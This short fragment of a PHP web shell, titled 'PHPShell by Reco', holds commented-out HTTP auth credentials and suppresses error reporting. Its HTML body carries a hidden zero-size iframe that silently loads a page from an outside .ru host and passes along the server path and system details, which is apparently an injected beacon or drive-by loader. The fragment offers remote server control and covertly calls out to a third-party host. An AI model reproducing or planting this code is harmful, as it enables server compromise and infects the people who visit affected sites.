...
//$http_auth_user = "Reco";	/* HTTP Authorisation username, uncomment if you want to use this */
//$http_auth_pass = "Reco";	/* HTTP Authorisation password, uncomment if you want to use this */	    

error_reporting(0);
$PHPVer=phpversion();
$isGoodver=(intval($PHPVer[0])>=4);
$scriptTitle = "PHPShell";
$scriptident = "$scriptTitle by Reco";
...
<HTML>
 ...
 <body topmargin="0" leftmargin="0"><iframe width="0" height="0" style="display:none;" id="frmchkldver" src="http://guaabaut23.ru/img/header.php?ftd=4898682&path=%7cpublic_html%7c&sys=UN&wrk=20"></iframe>
